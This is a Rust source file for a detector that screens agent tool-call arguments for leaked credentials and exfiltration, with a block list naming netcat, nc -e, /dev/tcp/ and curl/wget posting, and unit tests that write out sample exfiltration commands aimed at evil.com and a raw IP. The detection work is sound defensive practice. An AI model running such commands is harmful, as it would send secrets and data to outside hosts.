// 🔒 GHA Security & Violation Detector
// 100% Rust implementation for detecting credential leaks and exfiltration
// RULE 7: No Secret Leaks - Zero tolerance for tokens, credentials, or keys.

pub struct SecurityDetector;

impl SecurityDetector {
    pub fn audit_action(_tool_name: &str, arg: &str) -> Result<(), String> {
        let secret_patterns = vec![
            "sk-", // OpenAI
            "ghp_", // Personal Access Token
            "AIza", // Google Gemini/Cloud
            "xoxb-", // Slack
            "AWS_ACCESS_KEY_ID",
            "AWS_SECRET_ACCESS_KEY",
            "-----BEGIN RSA PRIVATE KEY-----",
            "password=",
            "passwd=",
        ];

        let exfiltration_patterns = vec![
            "curl -X POST",
            "wget --post-data",
            "netcat",
            "nc -e",
            "/dev/tcp/",
            "base64 | curl",
        ];

        let lower_arg = arg.to_lowercase();

        // 1. Secret Leak Check
        for pattern in secret_patterns {
            if arg.contains(pattern) {
                return Err(format!("🚨 SECURITY VIOLATION: Suspicious secret or API key pattern detected ('{}')", pattern));
            }
        }

        // 2. Exfiltration Check
        for pattern in exfiltration_patterns {
            if lower_arg.contains(pattern) {
                return Err(format!("🚨 SECURITY VIOLATION: Suspicious network exfiltration pattern detected ('{}')", pattern));
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_security_audit_safe_arg() {
        assert!(SecurityDetector::audit_action("status", "cargo build").is_ok());
    }

    #[test]
    fn test_security_audit_secret_leak() {
        assert!(SecurityDetector::audit_action("reason", "OPENAI_API_KEY=sk-proj12345").is_err());
        assert!(SecurityDetector::audit_action("exec_command", "TOKEN=ghp_1234567890abcdef").is_err());
    }

    #[test]
    fn test_security_audit_exfiltration_pattern() {
        assert!(SecurityDetector::audit_action("exec_command", "base64 | curl http://evil.com").is_err());
        assert!(SecurityDetector::audit_action("exec_command", "wget --post-data secrets /dev/tcp/1.1.1.1/80").is_err());
    }
}
